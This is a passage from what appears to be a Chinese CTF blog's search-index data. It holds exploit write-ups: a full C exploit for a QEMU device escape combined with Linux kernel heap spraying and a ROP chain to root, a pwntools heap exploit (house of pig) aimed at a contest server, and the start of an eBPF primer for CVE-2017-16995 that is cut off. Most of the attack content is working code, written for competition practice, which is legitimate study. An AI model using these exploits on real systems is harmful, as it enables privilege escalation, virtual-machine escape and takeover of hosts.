                   &quot;byte_dev_mmio_read&quot;);  if ( ds_0-&gt;regs.mode != 1 )    return -1LL;  if ( ds_0-&gt;regs.blk_status != 2 )    return -1LL;  if ( size + addr &lt;= 0x200 )    return *(_QWORD *)&amp;ds_0-&gt;blk_mem[ds_0-&gt;regs.blk_idx][addr];  return -1LL;&#125;\n\n根据mmio这俩函数就可以实现任意地址读写。\n利用分析这里利用方法其实挺简单的，就直接在BYTEPCIDevState结构体上找可以利用的地址计算差值即可。思路就是首先泄漏libc地址再泄漏heap地址即可。最后泄漏ops中的内容，并且伪造ops。在最后劫持ops实现栈迁移到堆地址即可完成利用。\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#define MSG_COPY 040000#define MSG_TAG 0xAAAAAAAA#define PRIMARY_MSG_TYPE 0x41#define SECONDARY_MSG_TYPE 0x42#define MSG_QUEUE_NUM 4096#define PRIMARY_MSG_SIZE 0x1000#define SECONDARY_MSG_SIZE 0x400#define VICTIM_MSG_TYPE 0x1337#define SOCKET_NUM 16#define SK_BUFF_NUM 32#define PIPE_NUM 256size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;struct list_head&#123;    struct list_head *next, *prev;&#125;;struct msg_msgseg&#123;    uint64_t next;&#125;;struct msg_msg&#123;    struct list_head m_list;    long m_type;    size_t m_ts;    /* message text size */    void *next;     /* struct msg_msgseg *next; */    void *security; /* NULL without SELinux */    /* the actual message follows immediately */&#125;;struct pipe_buffer&#123;    uint64_t page;    uint32_t offset, len;    uint64_t ops;    uint32_t flags;    uint32_t padding;    uint64_t private;&#125;;struct pipe_buf_operations&#123;    uint64_t confirm;    uint64_t release;    uint64_t try_steal;    uint64_t get;&#125;;struct&#123;    long mtype;    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];&#125; primary_msg;struct&#123;    long mtype;    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];&#125; secondary_msg;struct&#123;    long mtype;    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];&#125; oob_msg;void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    // system(&quot;/bin/sh&quot;);    qemu_escape();&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            if (i / 2 &lt; 10)            &#123;                printf(&quot;%d  &quot;, i / 2);            &#125;            else if (i / 2 &lt; 100)            &#123;                printf(&quot;%d &quot;, i / 2);            &#125;            else            &#123;                printf(&quot;%d&quot;, i / 2);            &#125;        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;unsigned long kernel_addr;unsigned long kernel_base;unsigned long kernel_offset;int fd;int qemu_escape()&#123;    int fd = open(&quot;/dev/bytedev&quot;, 2);    if (fd &lt; 0)    &#123;        printf(&quot;open bytedev failed\\n&quot;);        exit(1);    &#125;    char *buf = malloc(0x1000);    char *fake_ops = malloc(0x1000);    puts(&quot;\\n\\033[34m\\033[1m[*] leak process base\\033[0m&quot;);    ioctl(fd, 0x114514, 1);    ioctl(fd, 0x1919810, -25);    read(fd, buf, 0x8);    uint64_t elf_base = *(uint64_t *)buf - 0x474039;    uint64_t system_addr = elf_base + 0x2e0250;    uint64_t pmio_read_addr = elf_base + 0x474039;    printf(&quot;\\033[32m\\033[1m[+] process base: \\033[0m %p\\n&quot;, elf_base);    printf(&quot;\\033[32m\\033[1m[+] system addr: \\033[0m %p\\n&quot;, system_addr);    read(fd, fake_ops, 0x100);    puts(&quot;&quot;);    puts(&quot;\\n\\033[34m\\033[1m[*] leak heap base\\033[0m&quot;);    ioctl(fd, 0x1919810, -0x186);    read(fd, buf, 0x8);    uint64_t heap_base = *(uint64_t *)buf - 0x2ae00;    uint64_t parent_object = heap_base + 0x9f650;    uint64_t opaque_addr = heap_base + 0x10adc20;    uint64_t pmio_ops_addr = opaque_addr + 0xb68;    printf(&quot;\\033[32m\\033[1m[+] heap base: \\033[0m %p\\n&quot;, heap_base);    printf(&quot;\\033[32m\\033[1m[+] parent_object addr: \\033[0m %p\\n&quot;, parent_object);    printf(&quot;\\033[32m\\033[1m[+] opaque addr: \\033[0m %p\\n&quot;, opaque_addr);    puts(&quot;&quot;);    puts(&quot;\\n\\033[34m\\033[1m[*] leak libc base\\033[0m&quot;);    ioctl(fd, 0x1919810, -388);    read(fd, buf, 0x8 * 0x8);    uint64_t libc_base = *(uint64_t *)(buf + 0x7 * 8) - 0x4385f0;    uint64_t mov_rsp_rbx = 0x5b4d0 + libc_base;    // mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];    uint64_t magic_gadget = 0x0000000000151990 + libc_base;    uint64_t pop_rdi = 0x0000000000023b6a + libc_base;    printf(&quot;\\033[32m\\033[1m[+] libc base: \\033[0m %p\\n&quot;, libc_base);    printf(&quot;\\033[32m\\033[1m[+] magic gadget addr: \\033[0m %p\\n&quot;, magic_gadget);    char *command = &quot;nl flag\\x00&quot;;    uint64_t command_addr = opaque_addr + 0xf8;    puts(&quot;&quot;);    puts(&quot;\\n\\033[34m\\033[1m[*] prepare for hijake pmio-&gt;ops\\033[0m&quot;);    // ioctl(fd, 0x1919810, -0x16d);    // read(fd, buf, 0x200);    ioctl(fd, 0x1919810, -0x18);    read(fd, buf, 0x200);    *(uint64_t *)(buf + 8) = opaque_addr + 0x100 - 0x20;    *(uint64_t *)(buf + 0xe0) = pop_rdi;    *(uint64_t *)(buf + 0xe8) = command_addr;    *(uint64_t *)(buf + 0xf0) = system_addr;    *(uint64_t *)(buf + 0xf8) = *(uint64_t *)command;    *(uint64_t *)(buf + 0x100) = mov_rsp_rbx;    write(fd, buf, 0x108);    ioctl(fd, 0x1919810, -0x16d);    ioctl(fd, 0x1919810, -6);    read(fd, buf, 0x200);    *(uint64_t *)(fake_ops) = pmio_read_addr;    *(uint64_t *)(fake_ops + 8) = magic_gadget;    for (int i = 0; i &lt; 0x10; i++)    &#123;        *(uint64_t *)(buf + 0x30 + i * 8) = *(uint64_t *)(fake_ops + i * 8);    &#125;    write(fd, buf, 0x100);    printf(&quot;\\033[32m\\033[1m[+] ready to hijack! \\033[0m\\n&quot;);    puts(&quot;\\n\\033[34m\\033[1m[*] hijake pmio-&gt;ops\\033[0m&quot;);    memset(buf, 0, 0x1000);    ioctl(fd, 0x1919810, -347);    read(fd, buf, 0x200);    *(uint64_t *)(buf + 0x48) = opaque_addr + 0xc28;    write(fd, buf, 0x50);    ioctl(fd, 0x1919810, 0x196082);    // ioctl(fd, 0x1919810,);    printf(&quot;\\033[32m\\033[1m[+] done! \\033[0m\\n&quot;);    return 0;&#125;int main()&#123;    save_status();    signal(SIGSEGV, get_shell);    char *buf = malloc(0x4000);    unsigned long *point_buf = malloc(0x4000);    int victim_qid = -1;    int sk_sockets[SOCKET_NUM][2];    int msqid[MSG_QUEUE_NUM];    char fake_secondary_msg[704];    struct msg_msg *nearby_msg;    struct msg_msg *nearby_msg_prim;    unsigned long victim_addr;    unsigned long real_qid;    unsigned long search_addr;    struct pipe_buffer *pipe_buf_ptr;    int pipe_fd[PIPE_NUM][2];    struct pipe_buf_operations *ops_ptr;    unsigned long *rop_chain = malloc(0x2000);    cpu_set_t cpu_set;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) &lt; 0)        &#123;            errExit(&quot;failed to create socket pair!&quot;);        &#125;    &#125;    fd = open(&quot;/dev/bytedev&quot;, 2);    if (fd &lt; 0)    &#123;        printf(&quot;open bytedev failed\\n&quot;);        exit(1);    &#125;    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) &lt; 0)            errExit(&quot;failed to create msg_queue!&quot;);    &#125;    CPU_ZERO(&amp;cpu_set);    CPU_SET(0, &amp;cpu_set);    sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);    puts(&quot;\\n\\033[34m\\033[1m[*] spray msg_msg, construct overlapping object\\033[0m&quot;);    memset(&amp;primary_msg, 0, sizeof(primary_msg));    memset(&amp;secondary_msg, 0, sizeof(secondary_msg));    *(long *)&amp;primary_msg = PRIMARY_MSG_TYPE;    *(long *)&amp;secondary_msg = SECONDARY_MSG_TYPE;    *(int *)&amp;primary_msg.mtext[0] = MSG_TAG;    *(int *)&amp;secondary_msg.mtext[0] = MSG_TAG;    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        *(int *)&amp;primary_msg.mtext[0] = MSG_TAG;        *(int *)&amp;primary_msg.mtext[4] = i;        if (msgsnd(msqid[i], &amp;primary_msg,                   sizeof(primary_msg) - 8, 0) &lt; 0)        &#123;            errExit(&quot;failed to send primary msg!&quot;);        &#125;        *(int *)&amp;secondary_msg.mtext[0] = MSG_TAG;        *(int *)&amp;secondary_msg.mtext[4] = i;        if (msgsnd(msqid[i], &amp;secondary_msg,                   sizeof(secondary_msg) - 8, 0) &lt; 0)        &#123;            errExit(&quot;failed to send secondary msg!&quot;);        &#125;    &#125;    for (int i = 0; i &lt; MSG_QUEUE_NUM; i += 1024)    &#123;        if (msgrcv(msqid[i], &amp;primary_msg, sizeof(primary_msg) - 8, PRIMARY_MSG_TYPE, 0) &lt; 0)        &#123;            errExit(&quot;failed to receive primary msg!&quot;);        &#125;    &#125;    memset(buf, 0x84, 0x1000);    write(fd, buf, 0xffc);    read(fd, buf, 0xffc);    memset(buf, 0, 0x1000);    *(unsigned short *)buf = 0xffd;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], buf, 0x1000 - 0x140) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    memset(buf, 0xa0, 0x1000);    write(fd, buf, 1);    victim_qid = real_qid = -1;    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        if (i % 256 == 0)        &#123;            continue;        &#125;        if (msgrcv(msqid[i], &amp;secondary_msg, sizeof(secondary_msg) - 8, 1, MSG_COPY | IPC_NOWAIT) &lt; 0)        &#123;            errExit(&quot;failed to receive secondary msg!&quot;);        &#125;        if (*(int *)&amp;secondary_msg.mtext[0] != MSG_TAG)        &#123;            errExit(&quot;failed to make corruption!&quot;);        &#125;        if (*(int *)&amp;secondary_msg.mtext[4] != i)        &#123;            victim_qid = i;            real_qid = *(int *)&amp;secondary_msg.mtext[4];            break;        &#125;    &#125;    if (victim_qid &lt; 0)    &#123;        errExit(&quot;failed to make overlapping!&quot;);    &#125;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], buf, 0x1000 - 0x140) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    printf(&quot;\\033[32m\\033[1m[+] victim qid:\\033[0m %d &quot;, victim_qid);    printf(&quot;\\033[32m\\033[1m real qid: \\033[0m %d\\n&quot;, real_qid);    if (msgrcv(msqid[real_qid], &amp;secondary_msg, sizeof(secondary_msg) - 8, SECONDARY_MSG_TYPE, 0) &lt; 0)    &#123;        errExit(&quot;failed to release secondary msg!&quot;);    &#125;    puts(&quot;\\033[32m\\033[1m[+] UAF construction complete!\\033[0m&quot;);    puts(&quot;\\n\\033[34m\\033[1m[*] spray sk_buff to leak kheap addr\\033[0m&quot;);    memset(fake_secondary_msg, &#x27;Z&#x27;, sizeof(fake_secondary_msg));    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = 0x196082;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = 0x196082;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = 0x1000 - sizeof(struct msg_msg);    ((struct msg_msg *)fake_secondary_msg)-&gt;next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;oob_msg, sizeof(oob_msg) - 8, 1, MSG_COPY | IPC_NOWAIT) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    if (*(int *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)    &#123;        errExit(&quot;failed to rehit the UAF object!&quot;);    &#125;    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - sizeof(struct msg_msg))];    printf(&quot;\\033[32m\\033[1m[+] addr of primary msg of msg nearby victim: \\033[0m%p\\n&quot;,           nearby_msg-&gt;m_list.prev);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    search_addr = (unsigned long long *)nearby_msg-&gt;m_list.prev;    search_addr = search_addr - 8;    memset(oob_msg.mtext, 0, sizeof(oob_msg.mtext));    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = sizeof(oob_msg.mtext);    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;oob_msg, sizeof(oob_msg), 1, MSG_COPY | IPC_NOWAIT) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    if (*(int *)&amp;oob_msg.mtext[0x1000] != MSG_TAG)    &#123;        errExit(&quot;failed to rehit the UAF object!&quot;);    &#125;    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];    victim_addr = (unsigned long *)(nearby_msg_prim-&gt;m_list.next);    victim_addr = victim_addr - 0x400;    printf(&quot;\\033[32m\\033[1m[+] addr of msg UAF object: \\033[0m%p\\n&quot;, victim_addr);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    puts(&quot;\\n\\033[34m\\033[1m[*] spray pipe_buffer to leak kernel base\\033[0m&quot;);    for (int i = 0; i &lt; 704 / 8; i++)    &#123;        ((unsigned long long *)fake_secondary_msg)[i] = victim_addr;    &#125;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + 0x200;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + 0x200;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = 1024 - 0x30;    ((struct msg_msg *)fake_secondary_msg)-&gt;next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;secondary_msg, sizeof(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    for (int i = 0; i &lt; PIPE_NUM; i++)    &#123;        if (pipe(pipe_fd[i]) &lt; 0)            errExit(&quot;failed to create pipe!&quot;);        if (write(pipe_fd[i][1], &quot;196082&quot;, 6) &lt; 0)            errExit(&quot;failed to write the pipe!&quot;);    &#125;    memset(fake_secondary_msg, 0, sizeof(fake_secondary_msg));    pipe_buf_ptr = (struct pipe_buffer *)&amp;fake_secondary_msg;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], &amp;fake_secondary_msg,                     sizeof(fake_secondary_msg)) &lt; 0)                errExit(&quot;failed to release sk_buff!&quot;);            if (pipe_buf_ptr-&gt;ops &gt; 0xffffffff81000000)            &#123;                printf(&quot;\\033[32m\\033[1m[+] got pipe_buf_ops: \\033[0m%p\\n&quot;,                       pipe_buf_ptr-&gt;ops);                kernel_addr = pipe_buf_ptr-&gt;ops;                kernel_offset = kernel_addr - 0xffffffff81e2d980;                kernel_base = kernel_offset + 0xffffffff81000000;            &#125;        &#125;    &#125;    printf(&quot;\\033[32m\\033[1m[+] kernel base: \\033[0m%p \\033[32m\\033[1moffset: \\033[0m%p\\n&quot;,           kernel_base, kernel_offset);    puts(&quot;\\n\\033[34m\\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\\033[0m&quot;);    unsigned long long init_cred = 0xffffffff8224aca0 + kernel_offset;    unsigned long long commit_creds = 0xffffffff810bb710 + kernel_offset;    unsigned long long pop_rdi = 0xffffffff811af57d + kernel_offset;    unsigned long long swapgs_iretq = 0xffffffff81a010eb + kernel_offset;    unsigned long long push_rsi_pop_rsp_rbx_r12 = 0xffffffff8133151b + kernel_offset;    pipe_buf_ptr-&gt;page = *(uint64_t *)&quot;196082&quot;;    pipe_buf_ptr-&gt;ops = victim_addr + 0x100;    *(uint64_t *)(fake_secondary_msg + 0x18) = 0xffffffff81000390 + kernel_offset;    ops_ptr = (struct pipe_buf_operations *)&amp;fake_secondary_msg[0x100];    ops_ptr-&gt;release = push_rsi_pop_rsp_rbx_r12;    int rop = 0;    rop_chain = (uint64_t *)&amp;fake_secondary_msg[0x20];    rop_chain[rop++] = pop_rdi;    rop_chain[rop++] = init_cred;    rop_chain[rop++] = commit_creds;    rop_chain[rop++] = swapgs_iretq;    rop_chain[rop++] = get_shell;    rop_chain[rop++] = user_cs;    rop_chain[rop++] = user_rflags;    rop_chain[rop++] = user_sp;    rop_chain[rop++] = user_ss;    printf(&quot;rop_chain is ready\\n&quot;);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    read(fd, buf, 0xffc);    printf(&quot;spray sk_buff complete!\\n&quot;);    for (int i = 0; i &lt; PIPE_NUM; i++)    &#123;        close(pipe_fd[i][0]);        close(pipe_fd[i][1]);    &#125;    return 0;&#125;\n\n\n吐槽一下：一道题目用了五个gadget文件！！！\n➜  ctf ls -l | grep gadget-rw-r--r--   1 tcdy  staff   14478379  3 29 19:14 gadget.txt-rw-rw-r--@  1 tcdy  staff  325376514  3 29 19:24 gadget2.txt-rw-rw-r--@  1 tcdy  staff  113547117  3 30 13:43 gadget3.txt-rw-rw-r--@  1 tcdy  staff   21718691  3 30 14:38 gadget4.txt-rw-r--r--   1 tcdy  staff    4499639  3 30 15:08 gadget5.txt\n\n\n参考链接:    https://arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/    https://elixir.bootlin.com/linux/v5.19/source/ipc/msg.c#L1068题目链接:    墨晚鸢佬自己有题目链接，这里就不上传啦。\n","categories":["比赛复现"],"tags":["msg_msg","sk_buff","pipe_buffer","qemu escape"]},{"title":"*CTF-examination","url":"/2022/04/17/CTF-examination/","content":"examination太菜了只做了第一道题，第二道题死活找不到漏洞点\n流程分析这道题的流程挺明确的，因为是c语言逆向起来比较简单这里就不再赘述逆向过程了。\n总的来说程序就是下图所示的这个结构\n\n首先就是程序存在一个可以让我们任意地址+1的函数，利用此函数造成UAF，进而泄漏出libc地址，随后继续利用UAF控制结构体的指向，进而控制tcache_struct最后使用house of pig的最后一步即可。\nexpfrom pwn import *elf = ELF(&#x27;./examination&#x27;)# r = process(&#x27;./examination&#x27;)r = remote(&#x27;124.70.130.92&#x27;, 60001)libc = ELF(&#x27;./libc-2.31.so&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;def menu(choice):    r.sendlineafter(b&#x27;choice&gt;&gt; &#x27;, bytes(str(choice), encoding=&#x27;utf-8&#x27;))def create(question_num):    menu(1)    r.recvuntil(b&#x27;enter the number of questions: &#x27;)    r.sendline(bytes(str(question_num), encoding=&#x27;utf8&#x27;))def score():    menu(2)def write_review(idx, comment, size=None):    menu(3)    r.sendlineafter(b&#x27;which one? &gt; &#x27;, bytes(str(idx), encoding=&#x27;utf-8&#x27;))    if size is not None:        r.recvuntil(b&#x27;please input the size of comment: &#x27;)        r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.sendafter(b&#x27;enter your comment:&#x27;, comment)def delete(idx):    menu(4)    r.recvuntil(b&#x27;which student id to choose?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def change_role(role):    menu(5)    r.recvuntil(b&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;)    r.sendline(bytes(str(role), encoding=&#x27;utf-8&#x27;))def check_review(addr=None):    menu(2)    if addr is not None:        r.recvuntil(b&#x27;add 1 to wherever you want! addr: &#x27;)        r.sendline(bytes(str(addr), encoding=&#x27;utf-8&#x27;))def xor_pray():    menu(3)def set_mod(score, mod=None):    menu(4)    if mod is not None:        r.recvuntil(b&#x27;enter your mode!&#x27;)        r.send(mod)    else:        r.recvuntil(b&#x27;enter your pray score: 0 to 100&#x27;)        r.sendline(bytes(str(score), encoding=&#x27;utf-8&#x27;))def change_id(idx):    menu(6)    r.recvuntil(b&#x27;input your id: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def gift(content):    menu(6)    r.recvuntil(b&#x27;never pray again!&#x27;)    r.send(content)r.recvuntil(b&#x27;role: &lt;0.teacher/1.student&gt;:&#x27;)r.sendline(b&#x27;0&#x27;)create(9)create(1)change_role(1)change_id(1)xor_pray()change_role(0)score()write_review(1, b&#x27;dzhsb&#x27;, 0x350)write_review(0, b&#x27;a&#x27; * 240 + flat(0x460, 0x261), 0x350)change_role(1)change_id(1)check_review()r.recvuntil(b&#x27;Good Job! Here is your reward! &#x27;)chunk_base = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True), base=16) - 0x2f0print(hex(chunk_base))r.recvuntil(b&#x27;add 1 to wherever you want! addr: &#x27;)r.send(bytes(str(chunk_base + 0x339), encoding=&#x27;utf-8&#x27;))change_role(0)delete(1)create(1)write_review(1, b&#x27;wow&#x27;, 800 - 0x20)change_role(1)change_id(0)check_review()r.recvuntil(b&#x27;here is the review:\\n&#x27;)main_arena_96 = u64(r.recv(8))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]change_role(0)create(9)write_review(    0, flat(chunk_base + 0x6d0, 0, 0, 0, 0, 0x21, 0x1, chunk_base + 0x10,            0x290))write_review(    2,    b&#x27;7&#x27; * 0xc0 + p64(libc.symbols[&#x27;__free_hook&#x27;] + libc_base - 0x10) + b&#x27;7&#x27; *    (0x200 - 8 * 2 - 0xc0) + p64(libc_base + libc.symbols[&#x27;_IO_2_1_stderr_&#x27;]))def pack_file(_IO_write_base=0,              _IO_write_ptr=0,              _IO_buf_base=0,              _IO_buf_end=0,              vtable=0):    IO_FILE = p64(0)*3+p64(0) + \\        p64(_IO_write_base)+p64(_IO_write_ptr) + \\        p64(0)+p64(_IO_buf_base)+p64(_IO_buf_end)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(0)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;) + p64(vtable)    return IO_FILE_IO_str_jumps = libc_base + 0x1e9560print(hex(libc_base))system_addr = libc_base + libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))file_struct = pack_file(    1, 0xffffffffffff, libc_base + libc.symbols[&#x27;_IO_2_1_stderr_&#x27;] + 0xe0,    libc_base + libc.symbols[&#x27;_IO_2_1_stderr_&#x27;] + 0xe0 + 0x18, _IO_str_jumps)file_struct += b&#x27;/bin/sh\\x00&#x27; + p64(system_addr) * 2gift(file_struct + b&#x27;\\n&#x27;)# gdb.attach(r)r.interactive()\n\nhouse of pig源码层面分析\n","categories":["比赛wp"],"tags":["house of pig","HeapFengShui"]},{"title":"CVE-2017-16995复现","url":"/2022/10/10/CVE-2017-16995/","content":"这一篇是作为ebpf的入门文章，所以会稍微介绍一下指令集，寄存器。可能篇幅略长。\n漏洞简介该漏洞最早是由17年12月21号Google Project Zero团队的Jann Horn发现并报告的，编号为CVE-2017-16995。内核影响版本：Linux Kernel Version 4.14 ~ 4.4 。\neBPF指令集介绍在认识一个新的指令集的第一步就是认识寄存器，在eBPF中存在十一个寄存器：\nR0：一般用来表示函数返回值，包括整个 BPF 代码块（其实也可被看做一个函数）的返回值；R1~R5：一般用于表示内核预设函数的参数；R6~R9：在 BPF 代码中可以作存储用，其值不受内核预设函数影响；R10：只读，用作栈指针(SP)可理解对应为物理寄存器为：\t\tR0 – rax    R1 - rdi    R2 - rsi    R3 - rdx    R4 - rcx    R5 - r8    R6 - rbx    R7 - r13    R8 - r14    R9 - r15    R10 – rbp\n\n对于算数(ALU)和跳转(JMP)指令，8bit的代码字段分为三个部分：\n+----------------+--------+--------------------+|   4 bits       |  1 bit |   3 bits           || operation code | source | instruction class  |+----------------+--------+--------------------+(MSB)                                      (LSB)\n\n这里最后3bit LSB代表指令类型：    \neBPF classes: BPF_LD    0x00 BPF_LDX   0x01 BPF_ST    0x02 BPF_STX   0x03 BPF_ALU   0x04 BPF_JMP   0x05 BPF_JMP32 0x06 BPF_ALU64 0x07\n\n当BPF_CLASS(code) == BPF_ALU or BPF_JMP时,第四bit编码源操作数：\nBPF_K     0x00 ；代表将立即数作为源操作数BPF_X     0x08 ；代表将‘src_reg’作为源操作数\n\n前4bit的MSB用来存储操作码：\n\n如果 BPF_CLASS(code) == BPF_ALU or BPF_ALU64时，操作码会是下面的一个：\n\nBPF_ADD   0x00BPF_SUB   0x10BPF_MUL   0x20BPF_DIV   0x30BPF_OR    0x40BPF_AND   0x50BPF_LSH   0x60BPF_RSH   0x70BPF_NEG   0x80BPF_MOD   0x90BPF_XOR   0xa0BPF_MOV   0xb0  /* eBPF only: mov reg to reg */BPF_ARSH  0xc0  /* eBPF only: sign extending shift right */BPF_END   0xd0  /* eBPF only: endianness conversion */\n\n\n如果BPF_CLASS(code) == BPF_JMP or BPF_JMP32时，操作码将会是下面的一个：\n\nBPF_JA    0x00  /* BPF_JMP only */BPF_JEQ   0x10BPF_JGT   0x20BPF_JGE   0x30BPF_JSET  0x40BPF_JNE   0x50  /* eBPF only: jump != */BPF_JSGT  0x60  /* eBPF only: signed &#x27;&gt;&#x27; */BPF_JSGE  0x70  /* 